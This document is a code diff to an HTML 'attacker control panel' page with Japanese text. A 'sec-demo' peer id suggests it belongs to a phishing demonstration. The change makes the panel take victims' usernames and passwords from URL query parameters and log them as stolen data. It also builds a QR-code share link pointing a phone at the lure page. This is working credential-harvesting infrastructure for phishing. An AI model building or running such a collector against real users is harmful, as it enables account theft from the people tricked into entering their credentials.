@@ -5,25 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>攻撃者ダッシュボード | 管理画面</title>
   <link rel="stylesheet" href="style.css">
-  <!-- PeerJSの読み込み -->
-  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 </head>
 <body class="admin-body">
 
   <div class="admin-header">
     <h1>🔴 ATTACKER CONTROL PANEL (C&C Server)</h1>
-    <div id="connection-status" style="color: #ffaa00; font-weight: bold;">接続待機中...</div>
+    <div id="connection-status" style="color: #2ed573; font-weight: bold;">🟢 リアルタイム監視中（URL直結モード）</div>
   </div>
 
-  <!-- 接続用のQRコード画像・リンク表示パネル -->
+  <!-- QRコード用のリンク表示 -->
   <div style="background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
-    <!-- aa.png-->
-       <!-- ファイル名を aa.png に変更 -->
-    <img src="ab.png" alt="接続用QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 6px;">
-
+    <img src="aa.png" alt="接続用QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 6px;">
     <div>
       <h3 style="color: #58a6ff; margin-bottom: 5px;">スマホ接続用URL</h3>
-      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取るか、下のリンクをコピーしてください。</p>
+      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取ってください。</p>
       <button class="btn-copy" onclick="copyShareUrl()" style="padding: 6px 12px; background: #238636; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">リンクをコピー</button>
     </div>
   </div>
@@ -48,41 +43,34 @@
   </table>
 
   <script>
-    // ルームID（PeerJSの接続用ID。固定またはランダム）
-    // ※QRコード側のリンク先URLと、ここで指定するIDを合わせる必要があります
-    const myId = "123"; // ここを固定のID（例: "123"）にしておくと便利です
-    
-    const baseUrl = window.location.href.replace('admin.html', '');
-    const shareUrl = `${baseUrl}index.html?room=${myId}`;
+    // GitHub Pagesの自分の管理者画面のURLをベースにする
+    const currentAdminUrl = window.location.href.split('?')[0];
+    const shareUrl = `index.html?admin=${encodeURIComponent(currentAdminUrl)}`;
 
     function copyShareUrl() {
-      navigator.clipboard.writeText(shareUrl).then(() => {
+      navigator.clipboard.writeText(window.location.origin + window.location.pathname.replace('admin.html', '') + shareUrl).then(() => {
         alert("スマホ用リンクをコピーしました！");
       });
     }
 
-    // PeerJSホストとして起動
-    const peer = new Peer("sec-demo-" + myId);
     let logs = [];
 
-    peer.on('open', (id) => {
-      document.getElementById('connection-status').innerText = "🟢 接続待機中 (スマホからのアクセス待ち)";
-    });
-
-    peer.on('connection', (conn) => {
-      document.getElementById('connection-status').innerText = "🔥 スマホ接続成功！データ待受中...";
-      document.getElementById('connection-status').style.color = "#2ed573";
-
-      conn.on('data', (data) => {
-        logs.unshift(data);
-        renderLogs();
-      });
-    });
-
-    peer.on('error', (err) => {
-      console.error(err);
-      document.getElementById('connection-status').innerText = "🔴 接続エラー";
-    });
+    // ページが読み込まれたときに、URLにくっついてきたデータがあるかチェックする
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('username')) {
+      const log = {
+        time: urlParams.get('time'),
+        device: urlParams.get('device'),
+        username: urlParams.get('username'),
+        password: urlParams.get('password')
+      };
+      logs.unshift(log);
+      renderLogs();
+      
+      // ステータスを「データ強奪成功」に変更
+      document.getElementById('connection-status').innerText = "🔥 被害者からのデータを強奪成功！";
+      document.getElementById('connection-status').style.color = "#ff4757";
+    }
 
     function renderLogs() {
       const listContainer = document.getElementById('log-list');
